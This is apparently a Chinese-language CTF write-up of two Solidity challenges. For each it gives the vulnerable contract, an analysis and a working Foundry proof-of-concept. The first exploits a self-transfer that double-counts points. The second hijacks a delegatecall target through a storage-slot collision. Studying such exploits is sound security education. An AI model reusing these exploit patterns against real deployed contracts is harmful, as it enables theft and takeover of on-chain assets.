# snctf wp

# svip

# 源码

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

contract SVIP {
    mapping(address => uint256) public points; // 分数
    mapping(address => bool) public isSuperVip;
    uint256 public numOfFree;
    bool cross;

    constructor() {}

    function promotionSVip() public {
        require(
            points[msg.sender] >= 999,
            "Sorry, you don't have enough points"
        );
        isSuperVip[msg.sender] = true;
    }

    function getPoint() public {
        require(numOfFree < 100);
        points[msg.sender] += 1;
        numOfFree++; //最多领100
    }

    function transferPoints(address to, uint256 amount) public {
        uint256 tempSender = points[msg.sender]; //100
        uint256 tempTo = points[to]; //100
        require(tempSender > amount);
        require(tempTo + amount > amount);
        points[msg.sender] = tempSender - amount; //
        points[to] = tempTo + amount; //
    }

    function check() external {
        require(isSuperVip[msg.sender] == true, "no");
        cross = true;
    }

    function isSolved() external view returns (bool) {
        require(cross == true);
        return true;
    }
}

```

# 题目分析

issolved是让isSuperVip\[msg.sender] == true

有一个领空投的函数`getPoint()`，每个人最多领100

然后顺着涉及`isSuperVip[msg.sender]`的有`promotionSVip()`函数，只要满足这个函数的require条件就能成为svip，require条件是<font style="background-color:#FBDFEF;">points\[msg.sender] >= 999</font>，而上边领空投最多只能领100，找找有没有别的方式还能加mapping的，那就找到了`transferPoints()`函数，正常是一个人转给另一个人，但是这里可以看见：

1. 没有限制to的地址
2. from和to的mapping是分别更新的

那么这样，就有了一个攻击漏洞点，类似于transferfrom的from和to填同一个账户地址，我们这里也是，自己给自己转，虽然前一步mapping减掉了，但后一步还会在原来没减的基础上再加amount这么多，然后再多循环几次，领到999就可以满足require条件，成为svip

## 攻击步骤

1. 循环领100次空投
2. 循环10次每次给自己转99
3. 调用`promotionSVip()`成为svip

# poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {SVIP} from "./SVIP.sol";

contract Attack {
    SVIP svip;

    function attack(address addr) external {
        svip = SVIP(addr);
        uint256 left = 100 - svip.numOfFree();
        for (uint256 i = 0; i < left; i++) {
            svip.getPoint();
        }
        for (uint256 i = 1; i <= 10; i++) {
            svip.transferPoints(address(this), 99);
        }
        svip.promotionSVip();
        svip.check();
        svip.isSolved();
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Attack} from "../src/Attack.sol";
import {Script} from "forge-std/Script.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack();
        attack.attack(0x8e272DeBecAB226AF8Bd2f9CC0D0cBa2D9222B35);
        vm.stopBroadcast();
    }
}

```

# 源码

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

//0x7B2c3C15DfEe33980ca8528e6BF7826eECf6eE27

contract SmallNailong {
  uint256 public number; //0
  uint256 public target; //1

  function setnumber(uint256 _number) public {
    number = _number;
    target =
    uint256(
      keccak256(
        abi.encodePacked(
          block.timestamp,
          block.prevrandao,
          msg.sender
        )
      )
    ) %
    1919810;
  }
}

contract BigNaiLong {
  address public nailong; //0 =_number
  uint256 public target = 114514; //1
  uint256 public number; //2

  constructor() {
    SmallNailong smallnailong = new SmallNailong();
    nailong = address(smallnailong);
  }

  function setnailong(uint256 _target, uint256 _number) external {
    target = _target;
    bytes memory data = abi.encodeWithSignature(
      "setnumber(uint256)",
      _number
    );
    delegate(data);
  }

  function setneedNumber(uint256 _number) public {
    number =
    uint256(keccak256(abi.encode(_number))) ^
    uint256(blockhash(block.number));
  }

  function delegate(bytes memory data) private {
    (bool success, ) = nailong.delegatecall(data);
    require(success, "delegatecall falied.");
  }

  function isSolved() external view returns (bool) {
    require(number == target, "You loss!");
    return true;
  }
}

```

# 我是奶龙

# 题目分析

看一遍这个源码，首先是注意到这个<font style="background-color:#FBDFEF;">delegatecall</font>。然后我看到两个合约插槽的对齐，还有delegatecall的方式，先委托合约这个`setnumber()`函数，改变0槽和1槽，0槽是直接指定改变，1槽是一长串计算，暂且不管他。主合约的0槽存放的是委托合约的地址，让我想起之前做的delegatecall漏洞题，是把委托合约换成我们的攻击合约地址，而这里也正好符合，那么大概第一步思路就是先调用第一遍delegatecall，更新主合约0槽的委托合约地址为我们的攻击合约，然后构思一下我们的攻击合约，写一个同名的函数，这样再delegatecall就会执行我们写的这个同名函数的代码逻辑，这就是攻击要点。

`issolved()`要求的num==target，可以看到target可以在第一遍delegatecall的时候指定，因为两个合约的target槽是对齐的，然后我们再在我们写的攻击合约，把num的槽和主合约的num槽对齐就可以，然后在同名函数里赋值和target一样的值就可以了。

## 攻击步骤

1. 写一个攻击合约，槽位与主合约对齐，内里写个`setnumber()`函数，把槽3的num设为调用函数输入的参数
2. 先调用一次delegatecall，设target的值（这里是直接设置的主函数的target，不涉及delegatecall），把委托合约换成我们的攻击合约地址
3. 再次delegatecall，设num的值，和上边第一步target一样即可，这样就是进入的我们攻击合约那个同名函数的逻辑，给num赋值（这里是delegatecall，但因为槽位对齐，所以主函数也是num被赋值）
4. target和num数值相同，通过issolved

# poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {BigNaiLong} from "./nailong.sol";

contract Attack {
    address public a; // 0
    uint256 public b; // 1，前两个槽不重要，只是为了对齐3槽凑数来的
    uint256 public number; // 2

    function setnumber(uint256 _num) public {
        number = _num;
    }
}
```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Attack} from "../src/Attack.sol";
import {BigNaiLong} from "../src/nailong.sol";
import {Script} from "forge-std/Script.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack();
        BigNaiLong bignailong = BigNaiLong(
            0x7B2c3C15DfEe33980ca8528e6BF7826eECf6eE27
        );
        bignailong.setnailong(7, uint256(uint160(address(attack))));//第一次delegatecall，把委托合约换成我们的攻击合约地址，赋值target==7
        bignailong.setnailong(7, 7);//第二次delegatecall，连接上的就是我们的攻击合约，把num也赋值成7，就能通过issolved的检查
        require(bignailong.isSolved(), "no");
        vm.stopBroadcast();
    }
}

```


> 更新: 2025-08-09 19:26:55  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/wi47d31zup7u26py>